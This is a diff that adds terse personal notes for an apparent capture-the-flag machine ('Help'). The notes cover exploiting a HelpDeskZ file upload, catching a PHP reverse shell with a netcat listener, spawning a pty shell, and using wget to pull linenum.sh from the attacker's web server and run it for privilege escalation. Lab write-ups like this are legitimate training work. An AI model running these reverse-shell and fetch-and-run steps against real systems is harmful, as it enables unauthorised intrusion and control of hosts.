@@ -1,0 +1,31 @@
+HELP
+helpdeskz exploit python3
+	https://github.com/trevlee/helpdeskz_exploit/blob/master/exploit
+
+Need to sync time with server? - yes
+	python3 timesync.py
+
+start a netcat listener
+	nc -v -n -l -p 9999
+
+change the php reverse shell to use local ip and netcat port
+	https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php
+
+python3 exploit.py http://10.10.10.121/support/uploads/tickets/
+				       ------------------------
+
+/home/help/user.txt
+
+python -c 'import pty; pty.spawn("/bin/bash")'
+
+run webserver on local machine in directory with scripts/exploits
+	python3 -m http.server 9999	
+	wget 10.10.14.20:9999/linenum.sh (from target machine)
+	chmod +x linenum.sh
+	./linenum.sh
+
+	
+
+get a better shell
+privesc?
+explore nodejs route?
